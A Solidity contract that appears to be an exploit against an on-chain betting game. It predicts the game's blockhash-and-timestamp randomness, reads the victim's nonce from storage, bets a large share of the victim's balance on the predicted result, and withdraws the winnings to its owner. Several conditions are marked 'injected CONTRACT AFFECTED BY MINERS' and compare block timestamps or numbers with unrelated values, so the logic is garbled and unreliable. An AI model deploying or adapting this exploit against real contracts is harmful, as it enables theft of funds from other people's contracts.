contract Victim {
    function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId);
}


contract BetWinner {
    uint randonce;
	address payable owner;
	Victim victim;
	
	constructor(Victim v) public {
		owner = msg.sender;
		victim = v;
	}
	
	function () payable external {
	}

	modifier onlyOwner() {
		require(msg.sender == owner);
		_;
	}
	
	//
	// w3.eth.getStorageAt("0x77F54E6a0ED49e8Ce5155468FeAEC29368B10465",7)
	//
	function setNonce(uint nonce) external onlyOwner {
		randonce = nonce;
	}
	
	function getMaxBet() public view onlyOwner returns (uint) {
	    return address(victim).balance * 80 / 100 * 10 / 19 - 1000;
	}
	
	function  doBet(uint weiValOverride) payable external onlyOwner {
	    uint weiVal = weiValOverride;
	    if (block.timestamp == 0) {	//injected CONTRACT AFFECTED BY MINERS
	        weiVal = getMaxBet();
	    }
		
		uint before = address(this).balance;
		
	    (uint betInfo, uint randonceNew) = getBet(randonce);
		
		if (block.timestamp != 2) {	//injected CONTRACT AFFECTED BY MINERS
			// call victim
			uint[] memory playid = new uint[](1);
			playid[0] = betInfo;
			
			uint[] memory betMoney = new uint[](1);
			betMoney[0] = weiVal;
			
			uint[] memory betContent = new uint[](1);
			betContent[0] = betInfo;
			victim.doBet.value(weiVal)(playid, betMoney, betContent,1);
			
			uint post = address(this).balance;
			require(before < post, "Sanity check");
    	    randonce = randonceNew;
		}

	}
	
    function getBet(uint randonce) public view onlyOwner returns (uint betInfo, uint randonceNew)  {
		uint[4] memory codes = [uint(0),0,0,0];//Winning numbers

		bytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
		randonce  = randonce + uint(code0hash)%1000;
		codes[0] = uint(code0hash) % 52 + 1;

		bytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
		randonce  = randonce + uint(code1hash)%1000;
		codes[1] = uint(code1hash) % 52 + 1;

		bytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
		randonce  = randonce + uint(code2hash)%1000;
		codes[2] = uint(code2hash) % 52 + 1;

		bytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));
		randonce  = randonce + uint(code3hash)%1000;
		codes[3] = uint(code3hash) % 52 + 1;

		// check winner
		uint code0 = codes[0]%13==0?13:codes[0]%13;
		uint code1 = codes[1]%13==0?13:codes[1]%13;
		uint code2 = codes[2]%13==0?13:codes[2]%13;
		uint code3 = codes[3]%13==0?13:codes[3]%13;
		uint  onecount = code0 + code2;
		uint  twocount = code1 + code3;
		onecount = onecount%10;
		twocount = twocount%10;
		  
		betInfo = 2;
		if(block.timestamp > twocount){	//injected CONTRACT AFFECTED BY MINERS
			betInfo = 1;
		} else if (block.number < twocount){	//injected CONTRACT AFFECTED BY MINERS
			betInfo = 3;
		}
		return (betInfo, randonce);
    }
	
	function withdraw() external onlyOwner{
		owner.transfer((address(this).balance));
	}


}